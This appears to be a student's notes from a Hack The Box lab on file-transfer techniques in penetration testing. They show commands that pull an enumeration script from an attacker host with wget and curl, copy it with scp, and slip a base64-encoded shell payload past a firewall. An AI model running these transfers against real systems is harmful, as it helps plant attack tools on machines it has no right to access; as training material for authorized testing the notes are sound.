## Wget
Open a server on the attack host to listen from anywhere from a port
```shell-session
alakin2504@htb[/htb]$ cd /tmp
alakin2504@htb[/htb]$ python3 -m http.server 8000
```

```shell-session
user@remotehost$ wget http://ATTACK_MACHINE_IP:8000/linenum.sh
```
In the remote host wget the file

No Wget on remote?

## cURL
```shell-session
user@remotehost$ curl http://10.10.14.1:8000/linenum.sh -o linenum.sh

100  144k  100  144k    0     0  176k      0 --:--:-- --:--:-- --:--:-- 176k
```

## SCP
```shell-session
alakin2504@htb[/htb]$ scp linenum.sh user@remotehost:/tmp/linenum.sh

user@remotehost's password: *********
linenum.sh
```
scp - can only be used after gaining ssh credentials.
the semicolon specifies the attack host's directory

## Base64
Some remote machine has a firewall the prevents receiving files from our machines.
Encoding the files maybe a shell payload in base64 then simply paste it on the remote works the same way as remote downloading a file from ours.
```shell-session
alakin2504@htb[/htb]$ base64 shell -w 0

f0VMRgIBAQAAAAAAAAAAAAIAPgABAAAA... <SNIP> ...lIuy9iaW4vc2gAU0iJ51JXSInmDwU
```

```shell-session
user@remotehost$ echo f0VMRgIBAQAAAAAAAAAAAAIAPgABAAAA... <SNIP> ...lIuy9iaW4vc2gAU0iJ51JXSInmDwU | base64 -d > shell
```

## Validating File Transfers
This is not a file transfer method but instead, validating the file.

We can either "file FILE_NAME"
or check the md5sum with "md5sum"

